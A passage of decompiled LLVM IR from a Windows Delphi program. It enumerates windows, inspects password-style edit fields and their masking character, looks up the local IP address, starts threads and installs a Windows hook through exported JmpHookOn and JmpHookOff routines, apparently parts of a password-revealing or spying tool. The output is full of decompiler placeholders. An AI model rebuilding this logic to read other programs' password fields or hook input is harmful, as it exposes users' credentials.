; <label>:2:                                      ; preds = %4, %dec_label_pc_406fcc
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1790
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1790
  br i1 %3, label %10, label %4, !insn.addr !1790

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1790
  %6 = load i8, i8* %5, align 1, !insn.addr !1790
  %7 = icmp eq i8 %6, 0, !insn.addr !1790
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1790
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1790
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1790
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1790
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1790
  br i1 %7, label %10, label %2, !insn.addr !1790

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1791
  ret i32 %11, !insn.addr !1792
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_407020() local_unnamed_addr {
dec_label_pc_407020:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1793
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1794
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1794
  %4 = add i32 %3, %1, !insn.addr !1795
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1795
  store i8 0, i8* %5, align 1, !insn.addr !1795
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1796
  ret i32 %6, !insn.addr !1797
}

define i32 @function_407054() local_unnamed_addr {
dec_label_pc_407054:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1798
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1799
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1800
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1800
  %6 = add i32 %5, %3, !insn.addr !1801
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1801
  store i8 0, i8* %7, align 1, !insn.addr !1801
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1802
  ret i32 %8, !insn.addr !1803
}

define i32 @function_40708c() local_unnamed_addr {
dec_label_pc_40708c:
  %0 = call i32 @function_4034c8(), !insn.addr !1804
  %1 = call i32 @function_4034c8(), !insn.addr !1805
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1806
  ret i32 %2, !insn.addr !1807
}

define i32 @function_4070cc() local_unnamed_addr {
dec_label_pc_4070cc:
  %0 = call i32 @function_4034c8(), !insn.addr !1808
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1809
  ret i32 %1, !insn.addr !1810
}

define i32 @function_407104() local_unnamed_addr {
dec_label_pc_407104:
  %0 = call i32 @function_4036c8(), !insn.addr !1811
  %1 = call i32 @function_4036c8(), !insn.addr !1812
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1813
  %3 = icmp eq i32 %2, 2, !insn.addr !1814
  %4 = zext i1 %3 to i32, !insn.addr !1815
  %5 = and i32 %2, -256, !insn.addr !1815
  %6 = or i32 %5, %4, !insn.addr !1815
  ret i32 %6, !insn.addr !1816
}

define i32 @function_407134() local_unnamed_addr {
dec_label_pc_407134:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1817
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1817
  %esp.02.reg2mem = alloca i32, !insn.addr !1817
  %storemerge3.reg2mem = alloca i32, !insn.addr !1817
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1818
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1818
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1818
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1819
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1820
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1821
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1821
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1822
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1822
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1822
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1823
  %9 = icmp eq i1 %8, false, !insn.addr !1824
  %10 = icmp eq i1 %9, false, !insn.addr !1825
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1825
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1825
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1825
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1825
  br i1 %10, label %dec_label_pc_407158, label %dec_label_pc_407198, !insn.addr !1825

dec_label_pc_407158:                              ; preds = %dec_label_pc_407134, %dec_label_pc_407158
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_407020(), !insn.addr !1826
  %12 = call i32 @function_407134(), !insn.addr !1827
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1828
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1828
  store i32 2, i32* %14, align 4, !insn.addr !1828
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1829
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1829
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1829
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1830
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1822
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1822
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1823
  %21 = icmp eq i1 %20, false, !insn.addr !1824
  %22 = icmp eq i1 %21, false, !insn.addr !1825
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1825
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1825
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1825
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1825
  br i1 %22, label %dec_label_pc_407158, label %dec_label_pc_407198, !insn.addr !1825

dec_label_pc_407198:                              ; preds = %dec_label_pc_407158, %dec_label_pc_407134
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1831
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1832
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1833
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1833
  store i32 4223413, i32* %25, align 4, !insn.addr !1833
  %26 = call i32 @"@LStrClr"(), !insn.addr !1834
  ret i32 %26, !insn.addr !1835
}

define i32 @function_4071ae() local_unnamed_addr {
dec_label_pc_4071ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1836
  ret i32 %0, !insn.addr !1836
}

define i32 @function_4071b3() local_unnamed_addr {
dec_label_pc_4071b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1837
}

define i32 @function_4071b5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4071b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1838
}

define i32 @function_4071c0() local_unnamed_addr {
dec_label_pc_4071c0:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1839
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1839
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1839
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1840
  %2 = call i32 @function_407054(), !insn.addr !1841
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1842
  %4 = call i32 @function_407134(), !insn.addr !1843
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1844
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1845
  %6 = call i32 @"@LStrClr"(), !insn.addr !1846
  ret i32 %6, !insn.addr !1847
}

define i32 @function_407221() local_unnamed_addr {
dec_label_pc_407221:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1848
  ret i32 %0, !insn.addr !1848
}

define i32 @function_407226() local_unnamed_addr {
dec_label_pc_407226:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1849
}

define i32 @function_407228(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407228:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1850
}

define i32 @function_407243() local_unnamed_addr {
dec_label_pc_407243:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1851
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1851
  store i32 %3, i32* %4, align 4, !insn.addr !1851
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1852
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1852
  %9 = add i8 %6, %8, !insn.addr !1852
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1852
  store i8 %9, i8* %10, align 1, !insn.addr !1852
  %11 = add i32 %2, 81, !insn.addr !1853
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1853
  %13 = load i8, i8* %12, align 1, !insn.addr !1853
  %14 = trunc i32 %1 to i8, !insn.addr !1853
  %15 = add i8 %13, %14, !insn.addr !1853
  store i8 %15, i8* %12, align 1, !insn.addr !1853
  %16 = load i32, i32* %eax, align 4, !insn.addr !1854
  ret i32 %16, !insn.addr !1854
}

define x86_fp80 @function_40724b() local_unnamed_addr {
dec_label_pc_40724b:
  %0 = call x86_fp80 @__decompiler_undefined_function_11()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1855
  ret x86_fp80 %1, !insn.addr !1856
}

define i32 @function_407250() local_unnamed_addr {
dec_label_pc_407250:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1857
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1858
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1858
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1858
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1859
  %3 = call i32 @function_407054(), !insn.addr !1860
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1861
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1862
  %6 = icmp eq i32 %5, 180, !insn.addr !1863
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1864
  br i1 %6, label %dec_label_pc_4072b3, label %dec_label_pc_40728e, !insn.addr !1864

dec_label_pc_40728e:                              ; preds = %dec_label_pc_407250
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1865
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1866
  %10 = icmp eq i1 %9, false, !insn.addr !1867
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1867
  br i1 %10, label %dec_label_pc_4072b3, label %dec_label_pc_40729a, !insn.addr !1867

dec_label_pc_40729a:                              ; preds = %dec_label_pc_40728e
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1868
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_4072b3

dec_label_pc_4072b3:                              ; preds = %dec_label_pc_40729a, %dec_label_pc_407250, %dec_label_pc_40728e
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1869
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1870
  %13 = add i32 %esp.1, 8, !insn.addr !1871
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1871
  store i32 4223702, i32* %14, align 4, !insn.addr !1871
  %15 = call i32 @"@LStrClr"(), !insn.addr !1872
  ret i32 %15, !insn.addr !1873
}

define i32 @function_4072cf() local_unnamed_addr {
dec_label_pc_4072cf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1874
  ret i32 %0, !insn.addr !1874
}

define i32 @function_4072d4() local_unnamed_addr {
dec_label_pc_4072d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1875
}

define i32 @function_4072d6(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4072d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1876
}

define i32 @function_4072ec() local_unnamed_addr {
dec_label_pc_4072ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1877
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1877
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1877
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1878
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1879
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1879
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !1880
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !1881
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !1882
  %11 = inttoptr i32 %1 to i32*, !insn.addr !1883
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !1883
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !1884
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1885
  %16 = ashr i32 %15, 31, !insn.addr !1886
  %17 = zext i32 %15 to i64, !insn.addr !1887
  %18 = zext i32 %16 to i64, !insn.addr !1887
  %19 = mul i64 %18, 4294967296, !insn.addr !1887
  %20 = or i64 %19, %17, !insn.addr !1887
  %21 = zext i32 %4 to i64, !insn.addr !1887
  %22 = sdiv i64 %20, %21, !insn.addr !1887
  %23 = trunc i64 %22 to i32, !insn.addr !1887
  ret i32 %23, !insn.addr !1888
}

define i32 @function_407348() local_unnamed_addr {
dec_label_pc_407348:
  %esp.0.reg2mem = alloca i32, !insn.addr !1889
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1890
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1890
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1890
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1891
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !1892
  %3 = icmp eq i32 %2, 0, !insn.addr !1892
  br i1 %3, label %dec_label_pc_407384, label %dec_label_pc_407371, !insn.addr !1893

dec_label_pc_407371:                              ; preds = %dec_label_pc_407348
  %4 = inttoptr i32 %2 to i32*, !insn.addr !1894
  store i32 0, i32* %4, align 4, !insn.addr !1894
  br label %dec_label_pc_407384, !insn.addr !1895

dec_label_pc_407384:                              ; preds = %dec_label_pc_407371, %dec_label_pc_407348
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !1896
  %6 = icmp eq i32 %5, 0, !insn.addr !1896
  br i1 %6, label %dec_label_pc_407398, label %dec_label_pc_40738e, !insn.addr !1897

dec_label_pc_40738e:                              ; preds = %dec_label_pc_407384
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !1898
  %8 = icmp eq i32 %7, 0, !insn.addr !1898
  %9 = icmp eq i1 %8, false, !insn.addr !1899
  br i1 %9, label %dec_label_pc_4073a2, label %dec_label_pc_407398, !insn.addr !1899

dec_label_pc_407398:                              ; preds = %dec_label_pc_40738e, %dec_label_pc_407384
  %10 = call i32 @function_40747c(), !insn.addr !1900
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1901
  br label %dec_label_pc_40743f, !insn.addr !1901

dec_label_pc_4073a2:                              ; preds = %dec_label_pc_40738e
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !1902
  %12 = icmp eq i8 %11, 0, !insn.addr !1902
  br i1 %12, label %dec_label_pc_4073cb, label %dec_label_pc_4073ac, !insn.addr !1903

dec_label_pc_4073ac:                              ; preds = %dec_label_pc_4073a2
  %13 = call i32 @function_406c64(), !insn.addr !1904
  %14 = icmp eq i32 %13, 0, !insn.addr !1905
  br i1 %14, label %dec_label_pc_4073cb, label %dec_label_pc_4073c4, !insn.addr !1906

dec_label_pc_4073c4:                              ; preds = %dec_label_pc_4073ac
  %15 = call i32 @function_40747c(), !insn.addr !1907
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1908
  br label %dec_label_pc_40743f, !insn.addr !1908

dec_label_pc_4073cb:                              ; preds = %dec_label_pc_4073ac, %dec_label_pc_4073a2
  %16 = call i32 @"@LStrCatN"(), !insn.addr !1909
  %17 = call i32 @"@LStrAsg"(), !insn.addr !1910
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 2 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1911
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1912
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !1913
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !1913
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1914
  %23 = call i32 @function_40747c(), !insn.addr !1915
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !1915
  br label %dec_label_pc_40743f, !insn.addr !1915

dec_label_pc_40743f:                              ; preds = %dec_label_pc_4073cb, %dec_label_pc_4073c4, %dec_label_pc_407398
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1916
  %25 = load i32, i32* %24, align 4, !insn.addr !1916
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1917
  %26 = add i32 %esp.0.reload, 8, !insn.addr !1918
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1918
  store i32 4224092, i32* %27, align 4, !insn.addr !1918
  %28 = call i32 @"@LStrClr"(), !insn.addr !1919
  ret i32 %28, !insn.addr !1920
}

define i32 @function_407455() local_unnamed_addr {
dec_label_pc_407455:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1921
  ret i32 %0, !insn.addr !1921
}

define i32 @function_40745a() local_unnamed_addr {
dec_label_pc_40745a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1922
}

define i32 @function_40745c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_40745c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1923
}

define i32 @function_40747c() local_unnamed_addr {
dec_label_pc_40747c:
  %0 = call i32 @"@LStrClr"(), !insn.addr !1924
  %1 = call i32 @"@LStrClr"(), !insn.addr !1925
  ret i32 %1, !insn.addr !1926
}

define i32 @function_407494() local_unnamed_addr {
dec_label_pc_407494:
  %eax.0.reg2mem = alloca i32, !insn.addr !1927
  %esp.0.reg2mem = alloca i32, !insn.addr !1927
  %esp.15.reg2mem = alloca i32, !insn.addr !1927
  %storemerge6.reg2mem = alloca i32, !insn.addr !1927
  %.reg2mem = alloca i32, !insn.addr !1927
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !1927
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !1928
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !1929
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !1930
  %5 = call i32 @"@LStrClr"(), !insn.addr !1931
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1932
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !1932
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !1933
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !1934
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !1935
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !1935
  %11 = icmp eq %hostent* %9, null, !insn.addr !1936
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1937
  br i1 %11, label %dec_label_pc_4074f2, label %dec_label_pc_4074cc, !insn.addr !1937

dec_label_pc_4074cc:                              ; preds = %dec_label_pc_407494
  %12 = add i32 %10, 12, !insn.addr !1938
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1938
  %14 = load i32, i32* %13, align 4, !insn.addr !1938
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1939
  %16 = load i32, i32* %15, align 4, !insn.addr !1939
  %17 = icmp eq i32 %16, 0, !insn.addr !1940
  %18 = icmp eq i1 %17, false, !insn.addr !1941
  br i1 %18, label %dec_label_pc_4074d3.lr.ph, label %dec_label_pc_4074ed, !insn.addr !1941

dec_label_pc_4074d3.lr.ph:                        ; preds = %dec_label_pc_4074cc
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !1934
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_4074d3

dec_label_pc_4074d3:                              ; preds = %dec_label_pc_4074d3.lr.ph, %dec_label_pc_4074e5
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !1942
  %21 = icmp eq i1 %20, false, !insn.addr !1943
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !1943
  br i1 %21, label %dec_label_pc_4074e5, label %dec_label_pc_4074d7, !insn.addr !1943

dec_label_pc_4074d7:                              ; preds = %dec_label_pc_4074d3
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !1944
  %23 = load i32, i32* %22, align 4, !insn.addr !1944
  %24 = add i32 %esp.15.reload, -4, !insn.addr !1944
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1944
  store i32 %23, i32* %25, align 4, !insn.addr !1944
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !1945
  %27 = call i32 @StrPas(), !insn.addr !1946
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !1946
  br label %dec_label_pc_4074e5, !insn.addr !1946

dec_label_pc_4074e5:                              ; preds = %dec_label_pc_4074d7, %dec_label_pc_4074d3
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !1947
  %29 = mul i32 %28, 4, !insn.addr !1939
  %30 = add i32 %29, %14, !insn.addr !1939
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1939
  %32 = load i32, i32* %31, align 4, !insn.addr !1939
  %33 = icmp eq i32 %32, 0, !insn.addr !1940
  %34 = icmp eq i1 %33, false, !insn.addr !1941
  store i32 %32, i32* %.reg2mem, !insn.addr !1941
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !1941
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !1941
  br i1 %34, label %dec_label_pc_4074d3, label %dec_label_pc_4074ed, !insn.addr !1941

dec_label_pc_4074ed:                              ; preds = %dec_label_pc_4074e5, %dec_label_pc_4074cc
  %35 = call i32 @WSACleanup(), !insn.addr !1948
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !1948
  br label %dec_label_pc_4074f2, !insn.addr !1948

dec_label_pc_4074f2:                              ; preds = %dec_label_pc_4074ed, %dec_label_pc_407494
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1949
}

define i32 @function_407500() local_unnamed_addr {
dec_label_pc_407500:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1950
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1950
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1950
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1951
  %2 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1952
  %3 = add i32 %2, 1, !insn.addr !1952
  store i32 %3, i32* @global_var_4096e0, align 4, !insn.addr !1952
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1953
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1954
  ret i32 0, !insn.addr !1955
}

define i32 @function_407525() local_unnamed_addr {
dec_label_pc_407525:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1956
  ret i32 %0, !insn.addr !1956
}

define i32 @function_40752a() local_unnamed_addr {
dec_label_pc_40752a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1957
}

define i32 @function_40752c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40752c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1958
}

define i32 @function_407530() local_unnamed_addr {
dec_label_pc_407530:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1959
  %2 = add i32 %1, -1, !insn.addr !1959
  store i32 %2, i32* @global_var_4096e0, align 4, !insn.addr !1959
  ret i32 %0, !insn.addr !1960
}

define i32 @function_407538(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407538:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1961
  %2 = call i32 @CallNextHookEx(i32* %1, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !1961
  ret i32 %2, !insn.addr !1962
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_407558:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4224312 to i32*), i32 3), !insn.addr !1963
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1963
  store i32 %2, i32* @global_var_4096e8, align 4, !insn.addr !1964
  %3 = icmp eq i32* %1, null, !insn.addr !1965
  %4 = icmp eq i1 %3, false, !insn.addr !1966
  %5 = sext i1 %4 to i32, !insn.addr !1967
  ret i32 %5, !insn.addr !1968
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_407584:
  %0 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1969
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1970
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1970
  %3 = sext i1 %2 to i32, !insn.addr !1970
  ret i32 %3, !insn.addr !1971
}

define i32 @function_407590() local_unnamed_addr {
dec_label_pc_407590:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1972
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1972
